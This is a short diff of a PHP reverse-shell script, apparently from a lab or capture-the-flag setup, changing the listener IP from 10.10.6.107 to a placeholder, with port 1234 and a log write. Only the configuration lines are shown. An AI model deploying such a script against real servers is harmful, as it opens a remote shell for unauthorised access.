@@ -6,7 +6,7 @@ file_put_contents('reverse_log.txt', 'Script executed');
 set_time_limit(0);
 
 // Define the target IP address and port for the reverse shell
-$ip = '10.10.6.107';  
+$ip = "[target_ip]";  
 $port = 1234;          
 
 // Define the chunk size for reading/writing data
